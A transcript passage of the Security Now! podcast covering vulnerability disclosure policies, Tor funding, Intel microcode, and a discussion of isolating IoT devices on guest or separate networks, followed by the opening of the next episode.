So anyway, they've done a formal disclosure.  I think all of that, this is sort of what the industry is coming to accept as the proper way this is being done.  Anybody who has got code out in public of this sort, who's got libraries which are in use by others, should make sure that they have some means of clearly being contacted if somebody finds a problem so that they're not surprised by the news that a problem in their code has just been made public because it wasn't easy for others who were finding problems to notify them privately, allowing them time to make the fix public and coordinate the disclosure.  So I think that's just all for the best.  It's the way we're seeing it being done these days.



And they also produced a WhatsApp Security Advisories page.  It's whatsapp.com/security/advisories.  They wanted to do this, and they explained what was behind this.  They said:  "Due to the policies and practices of app stores, we [Facebook or WhatsApp] cannot always list security advisories within app release notes.  This advisory page provides a comprehensive list of WhatsApp security updates and associated CVEs," you know, the common vulnerabilities and exposures.  "Please note that the details included in CVE descriptions are meant to help researchers understand technical scenarios and does not imply users were impacted in this manner."



So essentially what they're saying is app stores, where new versions of WhatsApp would be made available, may not have the freedom, as a consequence of the terms and conditions of the app store, to say as much as they want to.  So they wanted to explicitly create a page where they'd be able to do that.  And the current page is gratifyingly short at the moment.  There were six CVEs disclosed for 2020 to date, and one of those was in 2019.  So unlike Microsoft's, where we're getting more than 120 problems every single month, here we've got a gratifyingly short policy, or list, rather, of CVEs for all of 2020.



And along the lines of vulnerability disclosures, it turns out that some work that was initiated last year has come to fruition for U.S. agencies, the result of which is that U.S. agencies must adopt and publish vulnerability disclosure policies for researchers finding problems on U.S. government sites by March of next year.  Bryan Ware, who is the Assistant Director of CISA, the Cybersecurity Infrastructure and Security Agency with the DHS in the U.S., blogged about the formalization of the U.S. government's policy.  In his posting, he explained that last November CISA asked for feedback on a draft of the binding operational directive which would be requiring most executive branch agencies to create this formal vulnerability disclosure policy, or VDP, which would inform those who discover flaws in a U.S. agency's digital infrastructure, where to send a report, what types of testing are authorized for which systems, and what sort of communication to expect in response.



He said:  "We'd never done a public comment round on a directive before; but since the subject matter was coordination with the public," he said, "this one merited it.  And even though the comment round spanned every holiday," he said, "from late November to early January" - so I guess, what, Thanksgiving through Christmas and New Year's - he said, "the quantity and quality of feedback was stellar."  He said:  "We received over 200 recommendations from more than 40 unique sources:  individual security researchers, academics, federal agencies, technology companies, civil society, and even members of Congress.  Each one made the directive draft, its implementation guidance, and this final VDP template better."



He further explained that several of the submissions asked whether the mobile apps that agencies offer to the public would be in scope of these agency VDPs, which was something they hadn't considered before and agreed that should be.  A few comments suggested several ways of thinking about the problems that would remove ambiguity around the scope, but including vulnerabilities and misconfigurations, which was something that had not been in scope before.  They also talked about reporting requirements which stop when everything is in scope, and how to respond to anonymous vulnerability reports.  And of course there's no response possible because they're anonymous.



He said that a number of comments discussed their use of target timelines concerned that the directive not mandate specific deadlines for remediation.  Fixing a vulnerability is not always a push-button, and requiring deadlines might create perverse incentives where, for example, a lower severity but older vulnerability might take organizational precedence over a newer but more critical bug.  He said that imposed deadlines might also cause rushed fixes.  So he said the final directive makes clear that the goal of setting target timelines in vulnerability disclosure handling procedures is meant to help organizations set and track performance metrics.  They are not mandatory remediation dates.



So anyway, I've got, for anyone who's interested, links both to a PDF of the detailed recommendations and also sort of a web-friendly version.  Essentially what it means is we will have a unified set of guidelines by the end of the first quarter of next year, which will serve to pull the U.S. government agencies together and make it very clear how researchers can interface with different agencies, how to communicate with the agencies, what is and is not fair game for vulnerability disclosure, and also to make it explicitly safe for the information security community to poke at sites when it's clear that the poking is meant to be in favor of the security of the site and not to take advantage of it.  In other words, white hat versus black hat.  Or I guess now we say good hat versus bad hat.



So anyway, all of this is addressed in this what they called the "Binding Operational Directive" for U.S. agencies, each of which will be putting out their own version of that tweaked in order to fit their specific requirements.  But everybody's going to have to have one in place by the end of the first quarter next year.  So I think that sounds like a great plan.



Tor has launched what they called a "membership program," starting or effective, it was announced, last Monday.  They announced it as a new means for nonprofit and private sector organizations to financially support the Tor Project's work.  And we've talked about it a little bit in the past.  Everybody knows what the Tor Project is.  It's been one of our really cool technology topics that we've talked about on the podcast through the years.  As we know, the Internet was designed to work, and somewhat audaciously and incredibly at the time, it was designed to robustly interconnect up to 4.3 billion endpoints all at once.  And that was only under IPv4.  Of course now under IPv6 that number is just ridiculously large.  But it was never designed, from the beginning, to incorporate authentication or privacy.  We added that stuff later.  But its fundamental nature has always been hostile to the provision of anonymity, which is the high bar that the Tor Project has set for itself.



In their announcement they wrote:  "For a while, we've been thinking about how to continue to increase the diversity of funds in the Tor Project's budget; and, more importantly, how to increase unrestricted funds.  The latest is a type of funding that allows us to be more agile with software development of Tor and other tools.  We decided to create a program inspired by what Tor is based on, community.  Our goal is to build a supportive relationship between our nonprofit and private sector organizations that use our technology or want to support our mission."



So the five founding members of this new initiative are Avast, DuckDuckGo, Insurgo, Mullvad VPN, and Team Cymru.  And perhaps that number will grow over time.  As we know, the Tor Project is unique, and it clearly has a place in our global Internet ecosystem.  I think there was a round of layoffs some time ago.  There was some problem with funds.  They get a lot of their funding by first generating a proposal and submitting it to various organizations, which then have to look at the proposal, put it through their funding cycles.  As I've researched a little more deeply into this, that often has something like a six-month turnaround.



So what that does is it makes it very difficult for them.  They have to decide what they want to do, generate a proposal, submit it into the budget cycle of the entities from which they get funding, and then sit back and wait six months.  Which means it's very difficult for them to do things in a much speedier fashion.  The idea of having a bunch of organizations that are interested in supporting the Tor project and are not tied into specific development budget cycles will allow them to operate much more quickly.  And again, as I said, I just think Tor, you know, it's trying to do something very difficult to do on the Internet.  We've talked about how hard it is to do this.  But it's got lots of good applications.  Also, unfortunately, some sketchy ones, too.  But still, anonymity has a place.  And I think this will make the project a lot more nimble going forward.



In the middle of July this year, Intel released updated microcode for a dauntingly long list of processors.  It was updated to incorporate the latest round of fixes for the most recent results of academic researchers further impacting Intel from a security standpoint.  That microcode, which can currently be loaded by Linux whenever it boots, is posted on GitHub, and I have a link in the show notes.  There's also a separate link for the even newer 10th-generation Ice Lake microcode.  And I have that link also in the show notes.  Microsoft has packaged and last week just released updated microcode for Intel processors, though not yet for Ice Lake.



Since these will not be included in Windows 10's monthly updates, anyone feeling that they need to have them for enhanced security will need to go get them deliberately.  And as we know, given that there has never been even one proven successful exploit of these edge case flaws outside of academic research, and the fact that they measurably and in many cases significantly reduce our processor's performance by disabling previous performance optimizations, and given that none of these are code execution flaws, and none of them certainly remotely available, they are all only a possibility for information leakage at the margins.  I am certainly not going to bother.  Probably ever.  Okay, "ever" is a long time.  We don't know what the future holds.



But aside from being great to discuss here on this podcast from a theoretical computing security standpoint - and it has been wonderful to talk about these things because they're interesting from a technological theoretical level - there's absolutely no reason in my opinion why any end user running a personal workstation, even in an enterprise environment, would ever have any need for any of this.  And as I said the last time we talked about this, I really could see Intel eventually offering two separate families of processors.  You know, just coming out with their highest performance family, which offers all of these performance benefits, with an understanding that there's going to be, in order to get the performance, there's going to be some potential for cross-process information leakage.  But in return, you're going to get all the performance you could ever ask for.



And then have a separate lower performance zero-tolerance family which could be used for those far less common situations where untrusted processes might be sharing common hardware, and where absolutely no possibility of cross-process leakage can be tolerated.  Maybe they'll do that, or maybe it'll be a simple switch that you can throw.  We know that there are means in the private registers of the chip for turning on and off some of these mitigations, so there is already some of that.



The affected processor families are Amber Lake, Avoton, Broadwell, Cascade Lake, Coffee Lake, Comet Lake, Haswell, Kaby Lake, Skylake, Valleyview, and Whiskey Lake.  But again, not Ice Lake, the 10th-generation processors.  And across that set of processor families there is a separate Windows 10 update for each of the eight different versions of Windows 10.  And I'll comment again I thought there was only going to be one version of Windows now.  Apparently I was quite wrong about that.  I've got a link to the Intel announcement with all of the processor guidance specifics for this incredibly long list of processor variations underneath each of those families.



Lawrence Abrams over at BleepingComputer has compiled all of the various links for all of the various Windows 10 releases, including the server versions, which is maybe where you might feel you need it.  But even then, only if you're hosting VMs with untrusted code executing.  I just, you know, this just seems like so much on the margins to me that it really seems like where we are now, several years downstream of the first of these edge cases that you and I, Leo, started talking about in 2019, and nothing still has continued to happen.  I just can't see any strong basis for people doing this.



LEO:  Yeah, yeah.  It's too hard.



STEVE:  Yeah, just doesn't make sense.  And it's interesting to me that Microsoft's not automatically pumping all these out because they know it's going to impact performance, and nobody wants that.



Okay.  So that's all of the security news of the week.  There was, I wanted to mention - this was often tweeted to me, as well, although just recently.  There was conducted in a hospital in Spain, just published last Thursday in JAMA - the Journal of the American Medical Association, so one of the top most respected journals.  This was the result of a very small, only 76 people, but it was an extremely well-conducted, randomized, double-blind study, so neither the patients nor the physicians or hospital staff knew who was getting what.  It was a study giving Vitamin D to these 76 patients in a 2:1 ratio, meaning that 50 of them received Vitamin D in addition to all of the hospital's standard COVID-19 best care practices; 25 were not given Vitamin D, but they also still received all of the hospital's standard best practices.



I've got a link to Chris Masterjohn's blog posting about this which just came out.  There's also a YouTube video.  Actually, I also made it the grc.sc Shortcut of the Week, so grc.sc/783.  This is a well-known Dr. John Campbell talking about the study.  He's an M.D., and he has 740,000 YouTube subscribers.  Anyway, he's just jumping up and down about this.  The study was so significant, despite the fact that only 76 people were involved.  Of the 50 patients who did receive Vitamin D, zero were put in ICU.  I'm sorry.  One of the 50 patients on Vitamin D ended up in ICU, zero deaths.  Of the 26 who did not receive Vitamin D but otherwise received all of the identical care, 13 of the 26 went into ICU, 11 of whom died.



So, I mean, this is - we've talked about Vitamin D before.  We saw an earlier chart that was posted.  This keeps being in the news.  We keep seeing studies.  And in fact this doctor is really furious that there isn't more attention being given to this because it looks like it's really significant.  So again, I just wanted to mention all the links are here for people to check out for themselves.  Vitamin D status looks like it is very, very significant for the outcome of coronavirus.



LEO:  I take my 5,000 IU every morning.



STEVE:  Good, ditto.  And everybody I know.



LEO:  Thank goodness.  Yeah.  Thanks to you.  Thanks to you, Steve, really.  I mean, you get a lot of credit for that.



STEVE:  Well, I read about it, as our listeners know, years ago, and it was just so clearly important.



SpinRite's work is progressing nicely.  The update to the earlier previous work from 2013 is now finished.  The benchmark is running for that.  It has been well tested for the last four or five days and got great results.  So the next thing up will be my amalgamation of the new support for the older IDE/ATA mode controllers with the newer support for the AHCI controllers.  Then I'll get it all packaged up for its broader first testing by everyone here.  Maybe by next podcast, that might be pushing it a little bit, but certainly by the one after that.  And I'm very excited to have our listeners able to play with this stuff, benchmark their mass storage drives, all mass storage drives.



In the process they will be verifying that SpinRite, the next SpinRite, 6.1, will work on all of their hardware and drives because that's the point of this early benchmark test is to  really just pound the crap out of this code that I've just written because it will then be moving into SpinRite, where it will become the new core of SpinRite's direct hardware access technology.  And then 6.1 will happen.  So anyway, exciting times.  We're getting close.



LEO:  Woohoo.



STEVE:  Yeah.  So as I mentioned at the top of the show, California's recent heat and humidity wave...



LEO:  Ugh.  Ucky.



STEVE:  Yeah.  It's been brutal, Leo.



LEO:  It really has.



STEVE:  But you know we shouldn't complain because most of the time we live in paradise.



LEO:  Oh, I know.  We pay the price, though, don't we.



STEVE:  Yeah, yeah.  Amber waves of grain and [crosstalk].



LEO:  Amber waves of fire.  You should see, I mean, it's what, it's 4:00 in the afternoon.  It looks like the twilight of the gods out there.  It's gloomy, it's gray...



STEVE:  It's weird.  All day the sun has just...



LEO:  It's weird.  The sun is red.



STEVE:  The color of the sky has just been - yeah.



LEO:  It's not good.



STEVE:  So I decided that I wanted to obtain remote control for my workplace's air conditioning so that, for example, if the day was going to be extremely hot, and I was going to be arriving at my workplace early, I could have the AC kick on at 5:00 a.m.



LEO:  Smart, yeah.



STEVE:  To begin cooling the place off so it's habitable by the time I get here.  And, I mean, it's like 90 degrees in my office when I walk in.



LEO:  Ooh, no, no.



STEVE:  It's like, okay, I've got to fix that.  And I also wanted to have 24/7 temperature and humidity monitoring.  I mean, like why not see what the temperature is?  That's just kind of cool.  And I guess I was just sort of dispositionally ready to start playing with this stuff a little bit.  So I purchased an Emerson Electric WiFi cloud-based thermostat and a continuous monitoring and logging thermometer-hygrometer.  Emerson Electric is a high-end commercial equipment provider that I had known of, and they also have a consumer branch.  And I'm very pleased with my little $91 thermostat purchase.  I don't need a touchscreen or high-resolution color display.  I just want minimal remote control and monitoring with some state-of-the-art scheduling features.



The logging thermometer brand is Govee, that I've never heard of before.  It's from the Chinese company Shenzhen Intellirocks Tech. Co., Ltd.



LEO:  Okay, mm-hmm.



STEVE:  I know, right.  Uh-huh.  At my other location, Lorrie and I were annoyed by the old-school mechanical timer we had turning some little popcorn lights we have on a tree on and off at dusk, like on at dusk, off after we went to sleep.  So I found just a cool little four-pack of WiFi outlets for $23 from Hong Kong-based Gosund.  Once again, who?  Yes, that's right, Gosund.  All of these IoT technologies tie, of course, into my networks at both locations through standard 2.4 GHz WiFi.  The very nice $39 Govee logging thermometer uses a little plugged-in base station which links to its indoor or outdoor remote sensor with a low power 433 MHz coded broadcast.



And while all this was great, I was quite conscious of the fact that, if I'm able to control the lights in my home while I'm out roaming around, and to similarly check the temperature and humidity at my office, I'm doing so by contacting servers in Shenzhen and Hong Kong.  Which have in turn been contacted by the WiFi-connected IoT appliances which are now beginning to populate my two locations.  And I do not mean to in any way besmirch these Chinese devices or their China-based services.  These are amazingly inexpensive and capable devices backed by free services.  And I don't care, frankly, if they go out of business in five years.



Starbucks charges more than $7 for coffee.  I paid $6 for a miraculous WiFi-connected AC plug that can entertain any sort of complex schedule I can imagine with manual override.  It's an incredible value.  But it's not so incredible if it leads to intrusions into my home or work networks and gets me hacked.



So here we are, 15 years into this podcast.  And we've recently covered critical vulnerabilities in the third-party TCP/IP stacks used by billions of similar embedded devices.  I have no idea what's inside these little white plastic miracle pods.  I have no idea how anyone can sell me one for $6.  And I know I'm not alone.  In fact, I'm probably nearly the last person to add some of this automation to my home or office.  I've been playing with it now for a week.  It's really cool.  It all works.



But think about this.  Right now at this very moment my world has three new persistently established outbound TCP links to external servers to which I am completely blind and over which I have no control.  So imagine what a graphic of the United States would look like, showing probably tens, if not hundreds of millions of persistently connected IoT devices linking across the continents to their home-hosted servers and services.  And now try to convince yourself that this hasn't occurred to some foreign power who may have agencies that are feeling a little defensive toward the U.S. at the moment.



Now, it's true that my various PCs and Apple devices have something similar.  But we know that a huge amount of work is continually going into the maintenance of the security of those devices - our PCs, our Macs, our Apple devices.  They're getting patches all the time.  All the bits are being scrutinized.  Does anyone imagine that my $6 AC plug is ever going to see a firmware update?  Not a snowball's chance in hell.  And that's fine, too, because it's working perfectly.  But modest as it is, it is, though it's hard to believe, it's a computer.  It's in my home.  It's on my network.  And it is always connected to China.



Which brings us to the title of today's podcast:  "IoT Isolation Strategies."  Because the one thing I didn't say is that, despite all of these multifarious potential threats, both my home and workplace networks are today completely safe from external intrusion and attack through any defects or flaws that those incredibly cost-effective, affordable, and feature-packed devices might have.  And the question is, is everybody else's network who's listening to this similarly safe?  We've spoken about this before, but I thought that it would be useful to do a refresher.



My own actual use of these technologies sort of like brought this home to me.  I ended up having to use different strategies in my two locations because I just had different hardware available to me.  Obviously, all these IoT devices connect via WiFi.  So the easiest and most straightforward solution is to use or obtain a WiFi router which offers a guest WiFi feature.  In my home location we have an ASUS RT-AC68U, a nice router, a few years old now.  I recently updated its firmware.  So ASUS is keeping it current.  And it offers a guest WiFi feature.  The guest WiFi has a different SSID, so it comes up in the list, and you can see it.  It has its own password and, crucially, no access to anything other than the Internet.  That's what the guest WiFi feature on one of these later model routers offers.



It may, however, have access to Universal Plug and Play, UPnP.  That I'm not sure of.  And of course any UPnP might be programmable to allow incoming unsolicited traffic to enter the non-guest network.  I don't know one way or the other about that.  That's something I haven't tested because, for me, UPnP is the first thing I disable when setting up a network.  Of course all of our listeners know that it's by design an inherently and entirely unauthenticated protocol.  So any device on the interior LAN is able to use UPnP to establish connectivity to it at its whim.  It's important to disable it, if you can, or to really restrict its control using some additional firewall rules if you need to. 



So you'll want to make certain that guest WiFi also has no access to the router's management web interface.  It shouldn't, but be sure by trying to access the router's web management and make sure that you just don't get any connection at all.  And really, at this point, as you're connecting things to your network, it's really crucial that you use an impossible-to-guess username and password for the management interface of your router.  There's just no reason not to.  You don't need to get into it very often, and you definitely don't want foreigners to get into it ever.  Your browser will remember its wacky login username and password.



So just make one of them that's impossible to guess, absolutely crazy impossible to enter even by hand, and leave it up to your password manager to fill that in.  And by all means take advantage of the fact that you have two crazy fields, both the admin and the password.  Make them both insane.  Why not?



So at home, when I was setting up that little $6 AC plug, I switched my iPhone over to the guest network, so that was the network that the plug would see when it paired up with my phone, and I gave it my guest login username and password.  So that's what the little plug is using.  It is an untrusted visitor in my home forever, and it should be in everyone's.  Okay?  But let's suppose that your WiFi router doesn't have a guest mode option.  There's really no safe way to share a WiFi access point with IoT devices where everyone is on the same wired and wireless network.



I did give it a bit of thought.  For example, an IoT device will almost certainly have a fixed MAC address, and it will always be configured via DHCP.  Probably you don't have any choice.  It's just, you know, oops, look, it's on the network, yay.  Right, easy.  Okay.  But the fact that it has a fixed MAC address means that, if your router allows for MAC-based DHCP assignment of fixed IPs, you could arrange to group all of your IoT devices within a fixed IP block within your network.  Then use router firewall rules to block that region's access to the rest of your network.



But that's a lot of work, and it's still not a great protection since the devices would still be on the same Ethernet broadcast domain, and they would have access to your router's management interface, which just makes me nervous.  A better solution is to pull a retired low band, that is, you know, a 6.4 GHz-only WiFi router or access point out of the garage, you probably have one that you retired laying around somewhere, and set it up as an isolated guest IoT network.  And that's what I did here at my workspace.



So I have two access points whose network traffic is isolated from each other at the router.  We'll talk about that in a second.  But because I'm also a bit of a belt-and-suspenders guy, and because it was possible, I also disabled the 2.4 GHz radio of my primary WiFi access point.  All I need there is 5 GHz.  And without exception, all of my IoT devices, the three that I have so far, are 2.4 GHz only.  And that's probably not going to change anytime soon because 2.4 GHz is less expensive.  Going dual band would be more expensive.



LEO:  Well, and most IoT devices don't have 5 GHz.



STEVE:  Exactly.  There's no way they're going to do 5 for a $6 power plug.  So all IoT is going to be 2.4.  There's no way that any IoT thing could even see the high band, the 5 GHz.  So anyway, I've got my - just because I could, I've got my IoT devices on a different, completely different frequency than my iPads and iPhone and laptops that are all able to use the faster 5 GHz band.  As we know, 5 GHz has a different penetration and reflection characteristic, so maybe it might be a problem, but you could try it in your home.  Turn off the 2.4 GHz radio and see if you still have good connectivity for all your stuff wherever you are.  In which case you could just dedicate that to IoT.



As for separating the IoT access point from the rest of your network, there are two solutions.  If you have a pfSense-based router, as I do, my little - I've talked about the SG-1100 from Netgate.  And I have an older, can't remember the supplier, but it's pfSense based.  Actually, I have them in both locations.  Or if you've got one of those little nifty Ubiquiti Edge Router X's that we were talking about years ago, either of those use an actual individual NIC, a network interface, for each physical port.



That allows you to strongly isolate the IoT network by placing on its own subnet.  You could leave your home on 192.168 dot whatever dot whatever, and set up the IoT network on a different private subnet, like 172.16 dot whatever dot whatever.  That way they will be on entirely separate Ethernet broadcast domains, no way for them to see each other.  And the IoT network will have no way to see anything else.  It'll be able to freely access the Internet, hook into cloud services anywhere.  But there's no way that anything that goes wrong there would be able to infect the rest of your network.  What?



LEO:  Forgive me, though, because this has always bugged me, even with the more complicated three-router solution.  One of the features of IoT devices, maybe you don't care, but is that I can sit at home on my network with my phone and access that device from my phone.



STEVE:  So I'm able to do that.



LEO:  You can do that across the other network?



STEVE:  Yes.



LEO:  Okay.



STEVE:  Yes, because they are each going out to the remote service and bridging that [crosstalk].



LEO:  So they're NATing it that way, NAT traversal that way, rather than going direct.



STEVE:  Well, they're actually not...



LEO:  If I connect, if I do my Hue lights, you're saying I'm going to the Hue server and then coming back in, as opposed to just across my network.  Oh, okay.



STEVE:  I think that you'll find that that's what happening, yes.



LEO:  Oh, okay, all right.  That explains it.  Yeah.  So as long as they're network addressable from the Internet...  



STEVE:  Correct.  Now, I should mention that I'm sort of in crawl before you walk mode.  I don't have a home hub or anything else.  All of these things are hubless devices.



LEO:  Right.



STEVE:  But they're working great for me with iPads and iPhones from all my locations.



LEO:  That makes sense.



STEVE:  Because they're all reaching out to cloud services.



LEO:  Right.  You're going to a third party.  You're doing kind of like a NAT traversal kind of thing.



STEVE:  Exactly.



LEO:  Okay.



STEVE:  Correct.  And of course therein lies the reason you want the isolation because I'm going out to a third party.



LEO:  Right.  Well, I understand.  Yes, I understand.  But you don't want somebody to come in from the outside world onto your network with your devices via this Internet device, so it's important that this Internet device have a barrier between you and your devices.  And I always thought that would hamper operation.  But if you're saying I'm going out to public Internet every time, then it wouldn't, obviously, yeah.



STEVE:  Right, right.  All these things now are cloud based.  So anyway, the first idea is to use a router, if you have one, where you've got individual NICs that allow you to set up separate networks per port.  Then you would take your older low-band 2.4 GHz-only router, use it as an access point, plug it into the port to which you have assigned a different subnet, and it's on the 'Net.  It's able to do everything it wants to.  But there's absolutely no way that it's connecting to the rest of your network.  So that's the solution, if you have one of those routers.



If you don't, then we talk about the cool old solution that we talked about that you mentioned, Leo, years ago.  You don't really need a three-router Y.  A second router is really all you need.  You would put the insecure one on your WAN, and then your secure router would plug into it.  And it would use the one-wayness of your secure router to protect your secure network and your 5 GHz-band radio from everything on its WAN side which would include the insecure network and then your connection out to the public Internet.



So the idea is it's a two NAT router solution where the inner NAT router is your secure one.  The outer NAT router is the insecure one.  Your Internet work, where you care about security, is protected by its router in the same way that it would if it were right on the WAN.  If it were right on the public Internet, everything upstream of it would be the Internet.  Now you have your less secure network is part of what is upstream of your main secure router, and no way for anything to crawl back into your secure router that is out on the WAN interface, as is the IoT network.  I think that's, you know, it's quick and easy, simple.  It does require a little additional hardware.



But if you've got a second WiFi router around that you're not using, make it the router that connects to your home's WAN, and then plug your secure router into it.  You've then got the double NAT solution protecting your home from anything that might happen on the insecure network.  And then I would say, you know, go to town with IoT, and security will not be a big concern.



LEO:  Very cool.  Very cool.  Yeah, you solved the one conundrum that I've had all along, and I should have asked you years ago, which is how do you talk to these things.  I wonder, though, if there are some IoT devices that you address directly via their local IP address.  I just don't know.  I just don't know.



STEVE:  I wonder how you would know what it was.  I guess if you were to broadcast an Ethernet, if you did an Ethernet broadcast you could find it.  In the same way, for example, that computers now find HP printers.



LEO:  It's Rendezvous, used to be called Rendezvous.  It's Bonjour now or whatever.  There's an Apple technology for discovery, zero-config discovery.  I mean, these things happen.  I just, you're right, it would make a lot more sense just to connect to a third-party server from both sides.  You don't have to find it.



STEVE:  Well, and all of these servers are using cloud functionality.



LEO:  Yeah.



STEVE:  For example, the thermostat, or the thermometer- hygrometer from Gosund, it's logging.  It's doing two years of cloud logging.  So anytime I want to I'm able to bring up an up-to-the-moment log of past temperature and humidity...



LEO:  That's cool.



STEVE:  ...which my phone doesn't store.  It doesn't store.  It's sending it off to Hong Kong, where the service exists.  And the Gosund app then reaches out to the cloud service in order to update its log.  So, I mean, and similarly...



LEO:  Completely connecting to their server, yeah.



STEVE:  ...these little $6 plugs, they don't have the schedule in them.



LEO:  Right.



STEVE:  They have, yeah, exactly, they have a persistent connection, and the service maintains the schedule and turns these things on and off for me.  So for $6.



LEO:  You know what, it's amazing because these things are so fast, I'm thinking of my Nest cameras or my Nest Hello doorbell.  You can quickly see them.  But there is a little bit of a lag as you probably are, you're going to the cloud.  They're going to the cloud, and you're getting the picture back from them.  That does make a lot of sense.  And they don't operate if you don't have Internet access.  They don't just operate in the network without Internet access; right?



STEVE:  Ah, right.  So it's not just LAN.



LEO:  Yeah, it can't just be LAN, yeah.  Well, that makes a lot of sense.  I just unfortunately, I could have done this, but I just unfortunately got the whole house wired, and it's got a central router that everything's connected to.  So most everything's Ethernet.  There's still WiFi.  I guess what I could do, the WiFi is - I'll figure that out.  I could guess I'd put a second WiFi network in there that's only 2.4 GHz.



STEVE:  Exactly.



LEO:  You don't want multiple WiFi networks though; right?  Aren't they going to collide with each other?  I guess they...



STEVE:  Well, and actually that is the other advantage of using 2.4 and 5.  They won't collide with each other.  And so you're giving your IoT stuff its own territory to have.  And then all of your laptops and iDevices, they're all able to run at 5.



LEO:  So I could get - I have plenty of cheap - I have lots of leftover WiFi routers.  I have the Edge Router X.  I could put the Edge Router X, plug that into the Ethernet, and set up a new 172-dot subnet.



STEVE:  Exactly.



LEO:  With that WiFi router.  And then just have that be the 2.4 GHz.  That's a good idea.  That doesn't seem too hard to do.



STEVE:  And Leo, I tell you, you know, I mean, if you can imagine a globe, we've all seen those globes of the missile traces in war games or something.  Can you imagine a picture of the connections that are from even just the U.S.'s IoT devices; you know?  Lord knows how many you have.



LEO:  Oh, my god, yeah.



STEVE:  I've got three.  I mean, there's just hundreds of millions of connections.



LEO:  I have three per room, yeah.



STEVE:  Yeah.



LEO:  No, every room has at least an Amazon Echo and a Google Assistant in it.  Obviously those all go to the central cloud.



STEVE:  Yup.



LEO:  I can control my lights, my Hue lights from either.  But obviously that's going to the cloud and then coming back down to the hub and doing it.  So yeah, yeah, I could do this.  It's going to be fun.  But, yeah, interesting.  I bet no one does this, though.  Just, you know, a handful of paranoid people.



STEVE:  And this was my point, Leo.  There will be, mark my words, there will be an exploit of some sort of widely dispersed IoT device where there's 100 million individual homes that are all linked to some service, or 10 million or something, where a vulnerability is found that allows bad guys to get into, like, all of those internal networks.  It is a way in, a way past everybody's NAT router.  We've been talking about NAT routers as a firewall forever.  These things, this little $6 power plug is sitting inside my network calling China.



LEO:  Right.



STEVE:  With a persistent connection.



LEO:  Yeah.  Wow.  Yeah.  That's scary.  Even if you're buying big name brands, and they're constantly being updated, firmware updated and stuff, it's still scary.  Yeah, you're putting a server in your house.  Inside your house you're putting a server.



STEVE:  Mistakes happen.  Mistakes happen.  And they're keeping this podcast in business.



LEO:  Yeah, we've always said, as soon as you put a server inside your network that is publicly accessible, which these have to be, you're at risk.



All right.  Thank you so much.  Always a pleasure, Steve Gibson.  Let's hear it for him.  Little golf clap.  Little round of applause.  Steve Gibson.  GRC.com is his website.  That's where you can go to get copies of the show.  He's got 16Kb versions of it for the bandwidth impaired.  He's got the normal 64Kb audio.  He's also got transcriptions.  Those are all available, thanks to Steve and Elaine Farris, who writes everything down.  And GRC.com's the place.



While you're there, pick up SpinRite.  Why not?  You're already there.  It's Steve's bread and butter.  It's the world's finest hard drive maintenance and recovery utility.  You buy it today, 6.0, you'll be getting 6.1 the minute it's available.  Plus you can kind of participate in the development of 6.1, I know.  That's kind of part of the privilege of being an owner.



STEVE:  It's true.  Yeah.



LEO:  Yeah.  GRC.com.  Lots of other stuff there.  If you're interested in Vitamin D, read up on that and all of Steve's health research.  That's all also there.  It's one of those sites you get to, and you go, oh, that's interesting.  Then find another thing, another thing.  Plan a couple of hours at least.  All afternoon.  In fact, plan a week.  What else are you going to do?



We also have versions of the show at our website, TWiT.tv/sn.  There's audio and video there.  You can watch us do the show live.  We try to be about 1:30 Pacific, 4:30 Eastern, 20:30 UTC of a Tuesday afternoon or evening.  But sometimes it runs a little late, depending on the morning shows.  Easiest thing to do, go to the website, TWiT.tv/live.  It's live all the time.  There's always something going on, and you can watch the behind-the-scenes, watch other shows, and on a Tuesday afternoon watch Security Now! with Steve Gibson.



The best thing to do, though, is subscribe.  Find a podcast application, search for Security Now!, subscribe to it.  We're everywhere.  Been around 15 years, you better believe we're everywhere.  And that way you'll never miss another episode.  And I know you don't want to miss an episode.  Thank you, Steve.  We'll see you next week on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#784

DATE:		September 15, 2020

TITLE:		BlindSide & BLURtooth

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-784.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at the Chrome browser's proactive technology which is designed to punish abusive ads.  We also look at the last hurrah for exploiting IE and Adobe Flash users, some Microsoft Edge updates, last Tuesday's Microsoft Patch-a-Palooza, Zoom's new implementation of two- factor authentication, that very bad WordPress File Manager attack two weeks out, the new Raccoon attack against TLS, and a quick SpinRite update.  Then we conclude with a look at two newly discovered attacks named BlindSide and BLURtooth.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  What Google's going to do about abusive ads.  Turns out they're going to block them.  One last hurrah for IE and Flash exploits.  And then Steve will talk about a very interesting new attack on servers, actually two of them, called BlindSide and BLURtooth.  Security Now! is next.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 784, recorded Tuesday, September 15th, 2020:  BlindSide and BLURtooth.



It's time for Security Now!, the show where we cover your security and privacy online with Steve Gibson, the man in charge of Security Now! from GRC.com.  Oh, it's spooky, spooky.



STEVE GIBSON:  It is.



LEO:  This is not our Halloween episode.



STEVE:  I think I've had too much caffeine.



LEO:  No, not possible.



STEVE:  So this was going to be named "BlindSide, BLURtooth, and Raccoon."  But as I was initially looking through the news of the week I thought, okay, you know, I was a little worried that it wouldn't fit on the screen.  And as it turns out, Raccoon didn't make the cut.  We'll talk about it because it is something that happened, but it isn't deserving of any particular depth.  So it's just BlindSide and BLURtooth, but both are really interesting.



LEO:  Have exploits, since we started doing the show 15 years ago, have the names gotten cuter?  Or is it just my imagination?



STEVE:  Oh, they're definitely gotten their own logos and websites.



LEO:  Yeah.



STEVE:  We didn't have that before.  So, yeah.  And no, I think you're right, I think there's...



LEO:  We've come a long way from Melissa; you know?



STEVE:  Yeah, and Honey Monkey, that sort of stirs up a strange image.  So anyway, yes.  We're going to take a look at the Chrome browser's proactive technology, which is designed to punish abusive ads.  We're also going to look at the last hurrah for exploiting IE and Adobe Flash users before those finally, thank goodness, fade away into oblivion and history.  We've got some Microsoft Edge updates which are interesting, so I like to sort of do browser stuff at the top of the show since that's become its own category because it's what we expose ourselves to when we venture out on the Internet.



